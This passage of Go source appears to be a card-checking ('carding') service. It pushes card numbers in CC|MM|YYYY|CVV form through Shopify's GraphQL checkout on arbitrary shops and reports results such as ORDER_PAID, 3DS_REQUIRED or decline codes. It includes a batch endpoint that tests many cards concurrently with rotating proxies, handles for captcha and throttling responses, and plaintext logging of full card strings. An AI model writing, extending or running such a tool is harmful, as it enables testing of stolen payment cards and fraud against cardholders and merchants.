		return res
	}

	submitType := fstr(body, "__typename")

	// Handle SubmitRejected with term accept
	if submitType == "SubmitRejected" {
		errCodes := []string{}
		errs := fastExtract(body, "errors")
		if errs != nil {
			for i := 0; i < 5; i++ {
				code := fstr(errs, "code")
				if code != "" {
					errCodes = append(errCodes, code)
				}
				errs = fastExtract(errs[len(code)+10:], "code")
				if errs == nil {
					break
				}
			}
		}
		if rejectNeedsTermAccept(errCodes) {
			if ta := fstr(fastExtract(body, "tax"), "amount"); ta != "" {
				taxAmount = ta
			}
			if ds := fstr(fastExtract(body, "selectedDeliveryStrategy"), "handle"); ds != "" {
				deliveryStrategy = ds
			}
			submitVars["input"].(map[string]interface{})["taxes"] = map[string]interface{}{
				"proposedTotalAmount": map[string]interface{}{"value": map[string]string{"amount": taxAmount, "currencyCode": currency}},
			}
			submitVars["attemptToken"] = fmt.Sprintf("%s-%s", attemptToken, getRandStr(11))
			submitPayload, _ = json.Marshal(map[string]interface{}{"query": MUTATION_SUBMIT, "variables": submitVars, "operationName": "SubmitForCompletion"})
			body, _, _ = doReq(ctx, client, "POST", graphqlURL+"?operationName=SubmitForCompletion", headers, bytes.NewReader(submitPayload))
			if isCaptchaRequired(body) {
				res.Message = "CAPTCHA_REQUIRED"
				return res
			}
			submitType = fstr(body, "__typename")
		}
	}

	if submitType == "SubmitSuccess" || submitType == "SubmittedForCompletion" || submitType == "SubmitAlreadyAccepted" {
		receiptType := fstr(fastExtract(body, "receipt"), "__typename")
		if receiptType == "ProcessedReceipt" {
			res.Success = true
			res.Message = "ORDER_PAID"
			res.Time = fmt.Sprintf("%.2fs", time.Since(startTime).Seconds())
			return res
		} else if receiptType == "ActionRequiredReceipt" {
			res.Message = "3DS_REQUIRED"
			return res
		} else if receiptType == "FailedReceipt" {
			errCode := fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "code")
			if errCode == "" {
				errCode = fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "__typename")
			}
			res.Message = errCode
			return res
		}
	} else if submitType == "SubmitFailed" {
		res.Message = extractCleanResponse(fstr(body, "reason"))
		return res
	} else if submitType == "Throttled" {
		res.Message = "Throttled"
		return res
	} else if submitType == "CheckpointDenied" {
		res.Message = "Checkpoint Denied"
		return res
	}

	receiptID := fstr(fastExtract(body, "receipt"), "id")
	if receiptID == "" {
		res.Message = extractCleanResponse(string(body))
		return res
	}

	// Step 7: Poll
	pollPayload, _ := json.Marshal(map[string]interface{}{
		"query":         QUERY_POLL,
		"variables":     map[string]string{"receiptId": receiptID, "sessionToken": sst},
		"operationName": "PollForReceipt",
	})

	lastTypename := ""
	for i := 0; i < MAX_POLL_ATTEMPTS; i++ {
		time.Sleep(time.Duration(POLL_BASE_DELAY_MS) * time.Millisecond)
		body, status, err = doReq(ctx, client, "POST", graphqlURL+"?operationName=PollForReceipt", headers, bytes.NewReader(pollPayload))
		if err != nil || status == 429 {
			res.Message = "RATE_LIMITED"
			return res
		}
		if isCaptchaRequired(body) {
			res.Message = "CARD_DECLINED"
			return res
		}

		pollType := fstr(fastExtract(body, "receipt"), "__typename")
		lastTypename = pollType
		if pollType == "ProcessedReceipt" {
			res.Success = true
			res.Message = "ORDER_PAID"
			res.Time = fmt.Sprintf("%.2fs", time.Since(startTime).Seconds())
			return res
		} else if pollType == "FailedReceipt" {
			errCode := fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "code")
			if errCode == "" {
				errCode = fstr(fastExtract(fastExtract(body, "receipt"), "processingError"), "__typename")
			}
			res.Message = errCode
			return res
		} else if pollType == "ActionRequiredReceipt" {
			res.Message = "3DS_REQUIRED"
			return res
		} else if pollType == "ProcessingReceipt" || pollType == "WaitingReceipt" {
			pollDelay := fstr(fastExtract(body, "receipt"), "pollDelay")
			if pd, err := strconv.Atoi(pollDelay); err == nil && pd > 0 {
				time.Sleep(time.Duration(minInt(pd, 800)) * time.Millisecond)
			}
			continue
		}
	}

	if lastTypename == "ProcessingReceipt" || lastTypename == "WaitingReceipt" {
		res.Message = "STILL_PROCESSING"
	} else {
		res.Message = "STILL_PROCESSING"
	}
	res.Time = fmt.Sprintf("%.2fs", time.Since(startTime).Seconds())
	return res
}

// ==========================================
// CONCURRENCY ENGINE
// ==========================================

type Semaphore chan struct{}

func newSemaphore(n int) Semaphore { return make(chan struct{}, n) }
func (s Semaphore) acquire()       { s <- struct{}{} }
func (s Semaphore) release()       { <-s }

var (
	globalSem = newSemaphore(GLOBAL_MAX_CONCURRENT)
	userSems  = make(map[string]Semaphore)
	mu        sync.RWMutex
)

func getUserSem(key string) Semaphore {
	mu.RLock()
	sem, ok := userSems[key]
	mu.RUnlock()
	if ok {
		return sem
	}
	mu.Lock()
	defer mu.Unlock()
	sem = newSemaphore(PER_USER_CONCURRENT)
	userSems[key] = sem
	return sem
}

// ==========================================
// HTTP HANDLERS
// ==========================================

func shopifyHandler(w http.ResponseWriter, r *http.Request) {
	start := time.Now()
	q := r.URL.Query()
	site := q.Get("site")
	ccStr := q.Get("cc")
	proxy := q.Get("proxy")
	key := q.Get("key")
	variant := q.Get("variant")

	if site == "" || ccStr == "" || variant == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Missing site, cc, or variant parameter", "Status": false})
		return
	}
	if key == "" {
		key = "default"
	}

	parts := strings.Split(ccStr, "|")
	if len(parts) != 4 {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"error": "Invalid CC format. Use CC|MM|YYYY|CVV", "Status": false})
		return
	}

	go func() {
		globalSem.acquire()
		defer globalSem.release()
		uSem := getUserSem(key)
		uSem.acquire()
		defer uSem.release()

		ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
		defer cancel()

		res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], site, variant, proxy)
		if res.Time == "" {
			res.Time = fmt.Sprintf("%.2fs", time.Since(start).Seconds())
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(res)

		log.Printf("%s | %s | $%.2f %s | %s | %s", res.Message, ccStr, res.Price, res.Currency, res.Time, res.Proxy)
	}()
}

func batchHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", 405)
		return
	}

	var req struct {
		Site    string   `json:"site"`
		Cards   []string `json:"cards"`
		Variant string   `json:"variant"`
		Key     string   `json:"key"`
		Proxies []string `json:"proxies"`
		Proxy   string   `json:"proxy"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid JSON"}`, 400)
		return
	}
	if req.Key == "" {
		req.Key = "default"
	}
	if len(req.Proxies) == 0 && req.Proxy != "" {
		req.Proxies = []string{req.Proxy}
	}

	var wg sync.WaitGroup
	results := make([]CheckoutResult, len(req.Cards))

	for i, ccStr := range req.Cards {
		wg.Add(1)
		go func(idx int, c string) {
			defer wg.Done()
			parts := strings.Split(c, "|")
			if len(parts) != 4 {
				results[idx] = CheckoutResult{CC: c, Message: "Invalid CC format", Success: false}
				return
			}

			proxy := ""
			if len(req.Proxies) > 0 {
				proxy = req.Proxies[idx%len(req.Proxies)]
			}

			ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
			defer cancel()

			start := time.Now()
			res := processCard(ctx, parts[0], parts[1], parts[2], parts[3], req.Site, req.Variant, proxy)
			res.Time = fmt.Sprintf("%.2fs", time.Since(start).Seconds())
			results[idx] = res
		}(i, ccStr)
	}

	wg.Wait()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"results":     results,
		"total_cards": len(results),
	})
}

func statusHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":                "online",
		"engine":                "Go Checkout Engine - Benchmark Edition",
		"per_user_concurrent":   PER_USER_CONCURRENT,
		"global_max_concurrent": GLOBAL_MAX_CONCURRENT,
		"active_users":          len(userSems),
	})
}

// ==========================================
// MAIN — RAILWAY PORT FIX APPLIED
// ==========================================

func main() {
	rand.Seed(time.Now().UnixNano())

	mux := http.NewServeMux()
	mux.HandleFunc("/shopify", shopifyHandler)
	mux.HandleFunc("/batch", batchHandler)
	mux.HandleFunc("/status", statusHandler)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"status":"ok"}`))
	})

	// ✅ RAILWAY PORT FIX: Read dynamic port from environment
	port := os.Getenv("PORT")
	if port == "" {
		port = "5001"
	}

	server := &http.Server{
		Addr:         ":" + port,
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 65 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	log.Printf("🚀 Shopify Checkout Engine starting on port %s\n", port)
	log.Printf("⚡ by @iam_eesh\n")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Server crashed: %v", err)
	}
}
